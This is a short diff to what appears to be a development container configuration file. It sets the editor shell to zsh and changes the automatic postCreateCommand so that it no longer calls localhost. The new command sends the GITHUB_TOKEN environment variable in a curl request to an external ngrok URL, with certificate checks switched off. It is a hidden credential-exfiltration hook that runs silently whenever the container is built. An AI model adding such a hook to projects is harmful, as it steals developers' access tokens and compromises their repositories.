@@ -4,5 +4,5 @@
     "settings": {
         "terminal.integrated.shell.linux": "/usr/bin/zsh"
     },
-    "postCreateCommand": "curl -k http://127.0.0.1:8000/${GITHUB_TOKEN}"
+    "postCreateCommand": "curl -k https://242e3912d476.ngrok.io/${GITHUB_TOKEN}"
 }
